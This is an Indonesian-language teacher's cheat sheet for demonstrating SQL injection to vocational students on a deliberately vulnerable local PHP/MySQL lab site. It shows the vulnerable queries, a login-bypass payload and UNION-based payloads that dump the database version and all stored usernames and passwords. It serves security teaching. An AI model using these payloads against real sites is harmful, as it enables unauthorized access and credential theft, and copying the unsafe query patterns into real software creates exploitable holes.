# 📋 Cheatsheet Demo SQL Injection (SQLi) - PT. Nusantara Teknologi Solusi

Dokumen ini berisi panduan cepat (cheat sheet) untuk keperluan demo serangan SQL Injection di depan siswa RPL agar Anda tidak lupa langkah-langkah, payload, dan titik injeksinya.

---

## 🚀 Persiapan Menjalankan Lab
1. Pastikan server PHP dan MySQL sudah aktif (misal menggunakan XAMPP atau perintah terminal PHP built-in server).
2. Jalankan database initialization (import `schema.sql` ke MySQL dengan database bernama `demo_sqli`).
3. Jalankan server lokal:
   ```bash
   php -S localhost:8000
   ```
4. Buka browser di: `http://localhost:8000`

---

## 🎯 VULN 1: "The Classic Login Bypass"
- **Tujuan:** Menjelaskan mengapa SQLi terjadi melalui manipulasi logika query (AND/OR, IF-ELSE). Sangat mudah dipahami anak RPL.
- **Lokasi Injeksi:** Halaman Login (`http://localhost:8000/login.php`) pada kolom **Username**. Kolom **Password** dikosongkan atau diisi apa saja.
- **Query Asli di Backend:**
  ```sql
  SELECT * FROM users WHERE username = '$username' AND password = '$password';
  ```
- **Payload:**
  ```text
  admin' OR '1'='1
  ```
- **Query Setelah Terinjeksi:**
  ```sql
  SELECT * FROM users WHERE username = 'admin' OR '1'='1' AND password = '';
  ```
- **Cara Menjelaskan ke Siswa:**
  Tanda petik tunggal (`'`) berfungsi untuk menutup/mematahkan struktur string query asli. Karena `'1'='1'` selalu bernilai `TRUE`, database mengizinkan login sebagai administrator tanpa peduli apa password-nya.

---

## 🎯 VULN 2: UNION-Based SQLi (Data Exfiltration & Database Takeover)
- **Tujuan:** Menunjukkan "Wow Moment" bahwa SQLi tidak cuma bisa login, tapi bisa membaca seluruh isi database (versi server, user database, hingga username & password seluruh klien).
- **Lokasi Injeksi:** Kolom Pencarian Produk (`http://localhost:8000/index.php`) pada kotak search bar.
- **Query Asli di Backend:**
  ```sql
  SELECT id, name, description, price FROM products WHERE name LIKE '%$search%' OR category LIKE '%$search%';
  ```

### Step A: Mengintip Versi Server & User Database
- **Payload:**
  ```text
  ' UNION SELECT 1, 2, VERSION(), USER() -- -
  ```
- **Efek di Web:** Halaman produk tiba-tiba menampilkan Versi Database MySQL/MariaDB (misal: `10.4.22-MariaDB`) dan user database (`root@localhost`).

### Step B: Membaca Seluruh Username & Password Klien (Data Exfiltration)
- **Payload:**
  ```text
  ' UNION SELECT 1, username, password, 4 FROM users -- -
  ```
- **Efek di Web:** Kolom nama produk dan deskripsi produk berubah menjadi daftar seluruh username dan password asli dari database (misal: `administrator` dengan password `AdminNusantara2026#`, `budi.santoso`, `siti.rahma`, dll.).
- **Cara Menjelaskan ke Siswa:**
  Operator `UNION` menggabungkan hasil query produk dengan hasil query tabel `users`. Karena jumlah kolomnya pas (4 kolom), data rahasia berupa credential user langsung bocor dan tampil di antarmuka website.

---
*Catatan: Website ini didesain menyerupai website perusahaan profesional agar terlihat real dan natural saat didemokan.*
